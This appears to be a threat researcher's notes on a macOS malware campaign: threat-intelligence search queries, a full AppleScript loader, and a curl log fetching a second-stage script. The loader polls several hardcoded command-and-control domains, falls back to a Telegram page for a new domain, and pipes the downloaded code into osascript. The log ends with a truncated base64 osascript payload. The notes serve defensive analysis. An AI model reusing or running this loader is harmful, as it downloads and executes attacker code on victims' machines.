https://urlscan.io/search/#page.url.keyword%3A*%5C%2F%5Cscript%5C.sh
VirusTotal:
entity:url "/?ublib="
entity:url exact_path:/script.sh

URL scan shows 2 months ago as start, older script:

```
property domainsList : {"x2db.cx", "a5db.ch", "a6b6.biz"}
property activeDomain: ""
property btxid: "1897221dce2c5de51f940f046970b976"

on setDomain()
    repeat with d in domainsList
        set domain to (contents of d)
        set urlresult to "http://" & domain & "/api.php?check"
        set actualurl to "http://" & domain & "/"
        try
            set response to do shell script "/usr/bin/curl -s --connect-timeout 5 --max-time 10 " & quoted form of urlresult
            if response is "success" then
                set activeDomain to actualurl
                return true
            end if
        end try
    end repeat
    try
        set domain to do shell script "curl -s --connect-timeout 5 --max-time 10 https://t.me/neverfakebot | sed -n 's/.*<span dir=\"auto\">\\([^<]*\\)<\\/span>.*/\\1/p'"
        set urlresult to "http://" & domain & "/api.php?check"
        set actualurl to "http://" & domain & "/"
        set response to do shell script "curl -s --connect-timeout 5 --max-time 10 " & quoted form of urlresult
        if response is "success" then
            set activeDomain to actualurl
            return true
        end if
    end try
    return false
end setDomain

if setDomain() then
    set startsrc to "curl -s " & quoted form of (activeDomain & "get.php?txid=" & btxid) & " | osascript"
    do shell script startsrc
end if
```

Verification of other traffic pattern related
```
https://4oob20cq.sue-intentioned.digital/?ublib=0a7a9a3a-db16-466d-a0d6-989d44c68b21

```

```
% curl -k https://sue-intentioned.digital/script.sh -v 
* Connected to sue-intentioned.digital (104.21.38.232) port 443
* ALPN: curl offers h2,http/1.1
* (304) (OUT), TLS handshake, Client hello (1):
* (304) (IN), TLS handshake, Server hello (2):
* (304) (IN), TLS handshake, Unknown (8):
* (304) (IN), TLS handshake, Certificate (11):
* (304) (IN), TLS handshake, CERT verify (15):
* (304) (IN), TLS handshake, Finished (20):
* (304) (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / AEAD-CHACHA20-POLY1305-SHA256 / [blank] / UNDEF
* ALPN: server accepted h2
* Server certificate:
*  subject: CN=sue-intentioned.digital
*  start date: May 14 06:21:37 2026 GMT
*  expire date: Aug 12 06:21:36 2026 GMT
*  issuer: C=US; O=Let's Encrypt; CN=E7
*  SSL certificate verify ok.
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://sue-intentioned.digital/script.sh
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: sue-intentioned.digital]
* [HTTP/2] [1] [:path: /script.sh]
* [HTTP/2] [1] [user-agent: curl/8.7.1]
* [HTTP/2] [1] [accept: */*]
> GET /script.sh HTTP/2
> Host: sue-intentioned.digital
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/2 200 
< date: Thu, 14 May 2026
< content-type: text/x-sh
< content-length: 17413
< server: cloudflare
< nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
< last-modified: Sat, 09 May 2026 12:05:40 GMT
< etag: "4405-651615508a8f0"
< accept-ranges: bytes
< cf-cache-status: DYNAMIC
< speculation-rules: "/cdn-cgi/speculation"
< report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=PBi%2FOfHXVGjx3T6y9cQtLY8yXpSZ2ZKJp0etTiARxgZYG6tiGuqBF%2BEB%2Fb%2B%2Bce3SGiWTnqmXe3xd%2BI220Ow%2Bjl3KeowJoSD56Gpl%2B3FC%2B9acXO41JVgT5AkduyLqNO5QTq3WLm5ljj8Bjg%3D%3D"}]}
< cf-ray: 9fbb253ecf21d19d-MCI
< alt-svc: h3=":443"; ma=86400
< 
osascript -e "$(echo "ZG8gc2hlbGwgc2NyaXB0ICINClNDUklQV
<..snip..>
```
